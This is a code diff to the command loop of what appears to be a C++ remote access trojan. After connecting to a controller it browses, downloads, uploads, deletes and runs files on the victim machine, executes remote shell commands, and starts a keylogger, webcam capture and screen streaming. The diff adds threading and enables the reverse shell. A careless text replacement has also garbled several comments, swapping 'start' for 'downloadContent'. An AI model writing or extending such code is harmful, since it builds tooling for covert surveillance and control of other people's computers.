@@ -16,6 +16,7 @@
 #include "state/SystemState.h"
 #include "install/Install.h"
 #include "configuration.h"
+#include "thread/ThreadGen.h"
 
 
 std::map<std::string, std::shared_ptr<Stream>> connections;
@@ -88,10 +89,15 @@ int main(int argc = 0, char *argv[] = nullptr) {
         bool connectionState = true;
         while (connectionState) {
             std::cout << "trying to connect " << std::endl;
+
             generate_sockets();
-            Stream stream = *connections["FILE_MANAGER"];
+            ThreadGen threadGen;
+            Stream stream = *get_connection("FILE_MANAGER");
             FileManager fileManager(stream);
-            stream = *connections["MAIN"];
+            //stream = *get_connection("DOWNLOAD");
+            Download download(stream);
+            stream = *get_connection("MAIN");
+            ReverseShell reverseShell(stream);
             SystemInformation sysInfo(stream);
             NetworkInformation networkInfo(stream);
 
@@ -136,43 +142,43 @@ int main(int argc = 0, char *argv[] = nullptr) {
                         break;
                     }
                     case 2: {  // Reading disks of system
-                        fileManager.sendDisks();
+                        threadGen.runInNewThread(&fileManager,&FileManager::sendDisks);
                         break;
                     }
                     case 3: { // Read all directory (files and folders)
-                        fileManager.send();
+                        threadGen.runInNewThread(&fileManager,&FileManager::send);
                         break;
                     }
                     case 5: { // download file or directory
-                       // download.start();
+                        threadGen.runInNewThread(&download, &Download::downloadContent);
                         break;
                     }
                     case 6: { // copy file or directory
-                        fileManager.copyFilesThread();
+                        threadGen.runInNewThread(&fileManager, &FileManager::copyFilesThread);
                         break;
                     }
                     case 7: { // move file or directory
-                        fileManager.moveFilesThread();
+                        threadGen.runInNewThread(&fileManager, &FileManager::moveFilesThread);
                         break;
                     }
                     case 8: { // delete file or directory
-                        fileManager.deleteFilesThread();
+                        threadGen.runInNewThread(&fileManager, &FileManager::deleteFilesThread);
                         break;
                     }
                     case 9: { // run file or directory
-                        fileManager.runFilesThread();
+                        threadGen.runInNewThread(&fileManager, &FileManager::runFilesThread);
                         break;
                     }
                     case 10: { // upload files to directory
-                        fileManager.uploadFiles();
+                        threadGen.runInNewThread(&fileManager, &FileManager::uploadFiles);
                         break;
                     }
                     case 11: { // executes command on shell
-                        //reverseShell.send();
+                        reverseShell.send();
                         break;
                     }
 #ifdef KEYLOGGER
-                    case 12: { // tries to start in new thread the keylogger if it's not running
+                    case 12: { // tries to downloadContent in new thread the keylogger if it's not running
                         keyLogger.tryStart();
                         break;
                     }
@@ -200,7 +206,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
                             break;
                         }
 
-                        case 17: { // start webcam with custom features
+                        case 17: { // downloadContent webcam with custom features
                             WebcamManager webcamManager(stream);
                             webcamManager.startWebcam();
                             break;
@@ -223,7 +229,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
                         break;
                     }
 #ifdef WEBCAM
-                        case 22: { // start screen streaming
+                        case 22: { // downloadContent screen streaming
                             ScreenStreamer screenStreamer(stream);
                             screenStreamer.send();
                             break;
